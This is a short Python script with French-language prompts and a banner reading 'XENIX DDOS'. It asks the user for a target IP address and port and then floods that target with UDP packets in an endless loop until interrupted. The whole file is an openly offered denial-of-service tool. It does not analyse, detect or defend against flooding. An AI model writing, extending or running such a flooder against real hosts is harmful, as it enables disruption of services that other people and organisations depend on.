import socket
from colorama import Fore, Style, init
init(autoreset=True)

def send_packets(target_ip, target_port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    try:
        packet_count = 0
        while True:
            sock.sendto(b"", (target_ip, target_port))
            packet_count += 1
            print(f"Paquet {packet_count} envoyé à {target_ip}:{target_port}")
    except KeyboardInterrupt:
        print(f"{Fore.RED}Arrêt de l'envoi des paquets. Total de paquets envoyés : {packet_count}{Style.RESET_ALL}")
        sock.close()

if __name__ == "__main__":
    while True:
        print("""

██╗  ██╗███████╗███╗   ██╗██╗██╗  ██╗    ██████╗ ██████╗  ██████╗ ███████╗
╚██╗██╔╝██╔════╝████╗  ██║██║╚██╗██╔╝    ██╔══██╗██╔══██╗██╔═══██╗██╔════╝
 ╚███╔╝ █████╗  ██╔██╗ ██║██║ ╚███╔╝     ██║  ██║██║  ██║██║   ██║███████╗
 ██╔██╗ ██╔══╝  ██║╚██╗██║██║ ██╔██╗     ██║  ██║██║  ██║██║   ██║╚════██║
██╔╝ ██╗███████╗██║ ╚████║██║██╔╝ ██╗    ██████╔╝██████╔╝╚██████╔╝███████║
╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝╚═╝╚═╝  ╚═╝    ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝
                                                                          
                                                        dev by xenix
""")
        print("1. xenix DDOS")
        print("2. Exit")
        choice = input("Entrez votre choix : ")

        if choice == "1":
            target_ip = input("Entrez l'adresse IP : ")
            try:
                target_port = int(input("Entrez le numéro de port default (80) : "))
                send_packets(target_ip, target_port)
            except ValueError:
                print("Veuillez entrer un numéro de port valide.")
        elif choice == "2":
            print("Au revoir.")
            break
        else:
            print("Choix non valide.")
